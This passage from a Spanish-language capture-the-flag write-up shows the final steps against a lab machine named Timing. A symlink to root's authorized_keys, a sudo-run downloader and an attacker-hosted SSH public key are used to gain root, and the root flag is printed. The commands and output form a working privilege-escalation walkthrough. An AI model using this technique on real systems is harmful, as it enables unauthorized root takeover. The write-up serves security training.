drwx------ 2 aaron aaron 4096 Nov 29 01:34 .cache
drwx------ 3 aaron aaron 4096 Nov 29 01:34 .gnupg
drwxrwxr-x 3 aaron aaron 4096 Nov 29 01:34 .local
-rw-r--r-- 1 aaron aaron  807 Apr  4  2018 .profile
lrwxrwxrwx 1 root  root     9 Oct  5  2021 .viminfo -> /dev/null
lrwxrwxrwx 1 aaron aaron   26 Apr  8 15:20 wild -> /root/.ssh/authorized_keys
-rw-r----- 1 root  aaron   33 Apr  8 13:34 user.txt
```

En nuestra máquina ahora generamos un par de claves SSH con ayuda de **`ssh-keygen`**

```console
p3ntest1ng:~$ ssh-keygen -t rsa -b 2048
Generating public/private rsa key pair.
Enter file in which to save the key (/home/any0ne/.ssh/id_rsa): pwnkey
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in pwnkey
Your public key has been saved in pwnkey.pub
The key fingerprint is:
SHA256:iQH2ALr4QTHNqANnwfaAuRJPVJ/uNMIkxDE1Ac/ZpdM any0ne@p3ntest1ng
The key's randomart image is:
+---[RSA 2048]----+
| *@@O.  .        |
|=oXBoO =         |
|oXoo= O E        |
|*o.+.. + .       |
|+.. o = S        |
| . . + .         |
|  .   .          |
|                 |
|                 |
+----[SHA256]-----+
p3ntest1ng:~$ cp pwnkey.pub wild
```

Compartimos de nuevo un servidor http (si hemos cerrado el anterior) en nuestra maquina para que podamos descargar el **`.pub`** generado previamente.

```console
p3ntest1ng:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Volvemos a ejecutar el script y le pasamos la URL de nuestro recurso:

```console
aaron@timing:~$ sudo /usr/bin/netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.16.40/wild
Initializing download: http://10.10.16.40/wild
File size: 571 bytes
Server unsupported, starting from scratch with one connection.
Starting download


Downloaded 571 byte in 0 seconds. (1.86 KB/s)

netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 2
```

Nos llega la petición al servidor...

```console
p3ntest1ng:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.135 - - [08/Apr/2022 17:02:54] "GET /wild HTTP/1.0" 200 -
10.10.11.135 - - [08/Apr/2022 17:02:55] "GET /wild HTTP/1.0" 200 -
^C
Keyboard interrupt received, exiting.
```

Ahora deberíamos ser capaces de conectarnos por SSH a la máquina como el usuario **`root`**, haciendo uso de nuestra clave privada.
Primero vamos a copiar la clave en nuestro directorio local **`~/.ssh/`** y asignarle los permisos adecuados.

```console
p3ntest1ng:~$ cp pwnkey ~/.ssh/pwnkey
p3ntest1ng:~$ chmod 600 ~/.ssh/pwnkey
p3ntest1ng:~$ ssh -i ~/.ssh/pwnkey root@10.10.11.135
...[snip]...
root@timing:~# ls
axel  netutils.jar  root.txt
root@timing:~# cat /root/root.txt
2eba350c0f2927d1ed53c2ddcd989901
```

### ¡Gracias por leer hasta el final!

#### Nos vemos en un próximo. ¡Feliz hacking! ☠